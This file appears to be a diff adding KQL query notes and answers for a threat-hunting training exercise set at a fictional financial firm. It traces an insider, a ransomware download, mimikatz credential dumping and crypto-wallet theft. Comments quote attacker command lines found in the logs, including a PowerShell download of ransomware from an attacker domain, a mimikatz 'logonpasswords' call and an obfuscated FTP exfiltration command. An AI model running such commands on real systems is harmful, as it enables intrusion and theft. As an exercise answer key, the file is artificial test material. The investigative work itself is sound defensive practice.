@@ -1,0 +1,381 @@
+// Section 0
+Employees
+| count
+
+Employees
+| where ip_addr == "10.10.0.216"
+// Nakia Acosta - nakia_acosta@encryptoderafinancial.com - naacosta
+
+Email
+| where recipient == "nakia_acosta@encryptoderafinancial.com"
+| count
+
+
+Email
+| where sender has "bitbingersbanking.net"
+| distinct sender
+| count
+
+OutboundNetworkEvents
+| where src_ip == "10.10.1.73" //Timothy Geefree
+| distinct  url
+| count
+
+PassiveDns
+| where domain contains "money"
+| distinct domain
+| count
+
+PassiveDns
+| where domain == "moneyppl.com"
+| distinct ip
+
+let karen_ips = 
+Employees
+| where name has "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (karen_ips)
+| distinct url
+| count
+
+//11
+let karen_un = Employees
+| where name has "Karen"
+| distinct username;
+AuthenticationEvents
+| where username in (karen_un)
+| count
+
+
+//Section 1
+Employees
+| where name has "Barry"
+// barry_shmelly@encryptoderafinancial.com - 10.10.0.1 - IGOY-DESKTOP
+
+// Q3 and Q5
+Email
+| where sender has "barry_shmelly@encryptoderafinancial.com"
+// I'm not coming in today. I'm sick of this place. We're all getting laid off anyway.
+// To: jarrod_rodriguez@encryptoderafinancial.com , michelle_collins@encryptoderafinancial.com , christopher_naylor@encryptoderafinancial.com
+// software_eng@encryptoderafinancial.com
+
+// Q4
+Employees
+| where email_addr == "christopher_naylor@encryptoderafinancial.com"
+// Social Media Manager
+
+// Q5
+Email
+| where sender has "barry_shmelly@encryptoderafinancial.com" and subject == "YOU ARE A GREEDY PIG!!!! WHAT IS WRONG WITH YOU?????"
+| distinct recipient
+//les_goh@encryptoderafinancial.com
+
+Employees
+| where email_addr contains "les_goh@encryptoderafinancial.com"
+| distinct role
+// Chief Executive Officer
+
+// Q7
+OutboundNetworkEvents
+| where src_ip == "10.10.0.1"
+| where timestamp > datetime(2023-12-26T08:02:53Z) and timestamp < datetime(2023-12-26T23:59:59Z)
+// https://www.cybersecurity-insiders.com/safe-ways-to-transfer-sensitive-files
+
+// Q8 
+OutboundNetworkEvents
+| where src_ip == "10.10.0.1"
+| where timestamp > datetime(2024-01-15T08:02:53Z) and timestamp < datetime(2024-01-15T23:59:59Z)
+// https://www.7-zip.org/a/7z2002-x64.exe
+// Q9 https://www.wikihow.com/Use-a-USB-Flash-Drive
+
+// Q10 
+FileCreationEvents
+| where hostname == "IGOY-DESKTOP"
+| where filename contains "secret"
+// C:\Users\bashmelly\Downloads\SECRET_MergersAndAcquisitions_Strategy2025.docx
+
+// Q11
+FileCreationEvents
+| where hostname == "IGOY-DESKTOP"
+| where filename contains "salary"
+
+// Q12
+FileCreationEvents
+| where hostname == "IGOY-DESKTOP"
+| where filename contains "zip"
+//Encryptodera_Proprietary_Algorithms.zip
+
+// Q13 and Q14
+ProcessEvents
+| where hostname has "IGOY-DESKTOP"
+// 7z.exe a -t7z C:\Users\bashmelly\Documents\To_Take\Personal_Memos.7z C:\Users\bashmelly\Desktop\Memos\*.txt -p securePass123 - 2024-01-16T11:00:41Z
+// E:\SchmellyDrive\
+
+// Section 2
+// Q1
+// YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt
+
+// Q3 - Q5
+FileCreationEvents
+| where filename has "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
+// 306
+// 2024-02-17T02:34:54Z - UL8R-MACHINE - sebone
+
+// Q6
+FileCreationEvents
+| where hostname == "UL8R-MACHINE" and path has "umadbro"
+// 50
+
+// Q7
+// umadbro
+
+// Q8
+ProcessEvents
+| where hostname == "UL8R-MACHINE"
+| where process_commandline has "umadbro"
+// start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro
+
+// Q9
+FileCreationEvents
+| where filename == "files_go_byebye.exe" and hostname == "UL8R-MACHINE"
+// 2024-02-17T02:30:50Z
+
+// Q10 - Q12
+ProcessEvents
+| where hostname == "UL8R-MACHINE"
+| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
+// Looks interestign: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+// taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+// 2024-02-17T02:29:53Z
+// powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
+// notification-finance-services.com
+// gpupdate /force
+
+// Q13 - Q18
+ProcessEvents
+| where process_commandline has "nltest /dclist"
+// 41QI-LAPTOP
+// cmd.exe /C nltest /dclist:encryptoderafinancial.com
+
+// Q19 - Q20
+FileCreationEvents
+| where hostname == '41QI-LAPTOP'
+/// Company_Financials_Q1_2024_Review.xlsx.exe
+// rokirby
+// 2024-02-01T08:50:12Z
+// screenconnect_client.exe
+
+
+// Q21
+FileCreationEvents
+| where filename has "screenconnect_client.exe"
+
+// Q22 - Q23
+Email
+| where link has "Company_Financials_Q1_2024_Review.xlsx.exe"
+// barry_shmelly@encryptoderafinancial.com
+
+// Q24
+// Recipient Emails
+//david_tuitt@encryptoderafinancial.com
+// valerie_orozco@encryptoderafinancial.com
+// rose_briggs@encryptoderafinancial.com
+// carl_johnston@encryptoderafinancial.com
+// sue_brady@encryptoderafinancial.com
+// marguerite_french@encryptoderafinancial.com
+// robin_kirby@encryptoderafinancial.com
+// eulah_foster@encryptoderafinancial.com
+// nancy_owens@encryptoderafinancial.com
+
+// Q25
+AuthenticationEvents
+| where username == "bashmelly"
+//143.38.175.105
+
+Employees
+| where name has "Barry"
+// bashmelly  - IGOY-DESKTOP - 10.10.0.1
+
+// Q26
+AuthenticationEvents
+| where src_ip == "143.38.175.105"
+| distinct username
+| count
+
+// Q27
+let hosts = ProcessEvents
+| where process_commandline has "systeminfo"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (hosts)
+| summarize dcount(hostname) by src_ip
+| order by dcount_hostname desc
+// c
+// 10.10.1.104
+
+// Q28
+Employees
+| where ip_addr == "10.10.0.138"
+
+// Q29
+AuthenticationEvents
+| where src_ip == "10.10.0.138"
+| where result == "Successful Login"
+
+// Q30
+AuthenticationEvents
+| where src_ip == "10.10.0.138"
+| where result == "Successful Login" and hostname contains "SERVER"
+// DOMAIN_CONTROLLER_SERVER
+
+// Section 3
+// Q1
+// lihenry_domain_admin - 2024-02-02T03:32:53Z
+
+// Q2
+AuthenticationEvents
+| where username == "lihenry_domain_admin"
+// GJ95-LAPTOP - 10.10.0.4
+
+// Q4
+ProcessEvents
+| where hostname == "GJ95-LAPTOP"
+| where process_commandline has "mimikatz"
+// totally_not_mimikatz.exe "sekurlsa::logonpasswords"
+
+Employees
+| where hostname == "GJ95-LAPTOP"
+// Valerie Orozco - 10.10.0.18 - valerie_orozco@encryptoderafinancial.com - vaorozco
+
+// Q7
+Email
+| where sender == "barry_shmelly@encryptoderafinancial.com" and recipient has "valerie_orozco@encryptoderafinancial.com"
+// Employee_Contact_List_Updated_March_2024.docx.exe
+// http://update-finance-security.biz/public/images/files/Employee_Contact_List_Updated_March_2024.docx.exe
+
+// Q8
+OutboundNetworkEvents
+//| where src_ip == "10.10.0.18"
+| where url has "Employee_Contact_List_Updated_March_2024.docx.exe"
+// no
+
+// Q9
+AuthenticationEvents
+| where hostname == "GJ95-LAPTOP"
+| distinct username
+| count
+
+// Q10
+AuthenticationEvents
+| where username == "systadmi_local_admin"
+| distinct hostname
+| count
+
+// Q11
+let hosts = FileCreationEvents
+| where filename has "screenconnect"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (hosts)
+| where username has "systadmi"
+| where result has "Successful"
+| join (
+    Employees 
+    | project ip_addr,role,email_addr,name
+) on $left.src_ip==$right.ip_addr
+| project SourceIpName=name, a="who is a", SourceIpUserRole=role, b="logged onto",hostname, c="using", username, d="at",timestamp
+// Robin Kirby - QW91-MACHINE -
+
+// Q12
+Email
+| where recipient == "robin_kirby@encryptoderafinancial.com" and sender == "barry_shmelly@encryptoderafinancial.com"
+// 2024-02-01T03:59:30Z
+
+// Section 4
+// Q1-Q2
+NetworkFlow
+| where timestamp between (datetime(2024-02-05T00:00:00Z) .. datetime(2024-02-05T23:59:59Z))
+| summarize TotalBytes = sum(bytes) by dest_ip
+| top 1 by TotalBytes desc
+| project dest_ip, TotalBytes
+// 182.56.23.121
+
+// Q3
+NetworkFlow
+| where dest_ip == "182.56.23.121"
+// 2024-01-21T13:28:33Z
+
+// Q4
+NetworkFlow
+| where dest_ip == "182.56.23.121"
+| extend Date = startofday(timestamp) // Extract the date part of the timestamp
+| summarize DistinctDays = count_distinct(Date) // Count distinct days
+| project DistinctDays
+
+// Q5
+NetworkFlow
+| where dest_ip == "182.56.23.121"
+| where timestamp between (datetime(2024-02-05T00:00:00Z) .. datetime(2024-02-05T23:59:59Z))
+//FTP
+
+ProcessEvents
+| where timestamp between (datetime(2024-02-05T00:00:00Z) .. datetime(2024-02-05T23:59:59Z))
+| where hostname == "GOTI-LAPTOP"
+
+Employees
+| where ip_addr == "10.10.0.2"
+// Jane Smith - GOTI-LAPTOP - jasmith -  jane_smith@encryptoderafinancial.com
+
+
+// Q6
+NetworkFlow
+| where dest_ip == "182.56.23.121"
+| summarize TotalBytes = sum(bytes) by dest_ip
+| top 1 by TotalBytes desc
+| project dest_ip, TotalBytes
+
+// Q7
+NetworkFlow
+| where dest_ip == "182.56.23.121"
+| distinct src_ip
+| count
+
+// Q8 - Q9
+Employees
+| where ip_addr == "10.10.0.2"
+// Jane Smith - GOTI-LAPTOP - jasmith -  jane_smith@encryptoderafinancial.com
+
+// Q10
+InboundNetworkEvents
+| where src_ip == "10.10.0.2"
+// https://encryptoderafinancial.com/search=Location+of+company%27s+cold+storage+crypto+wallets
+
+// Q11
+Email
+| where sender == "jane_smith@encryptoderafinancial.com"
+// elboss@westealurcrypto.com
+
+// Q12
+Email
+| where sender == "elboss@westealurcrypto.com"
+// 182.56.23.121
+
+// Q13 - Q14
+FileCreationEvents
+| where hostname == "GOTI-LAPTOP"
+// files_go_byebye.exe
+// crypto theft: crypto_stealer.exe
+//data exfil: ftp_client.exe
+
+// Q15
+ProcessEvents
+| where hostname == "GOTI-LAPTOP"
+| where parent_process_name has ""
+| where process_commandline has "powershell"
+// powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
+// crypto_stealer.exe --daily --input \\\\NetworkShare\\critical_infrastructure\\Crypto_Wallet_Storage_Locations\\ --output C:\\Users\\jasmith\\ToTheMoon\\
+// Answer: C:\\Users\\jasmith\\ToTheMoon\\
+
+//( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''
+// reverse: Ugot2muchCRYTOw3llt4k3it0FFurH4ND5
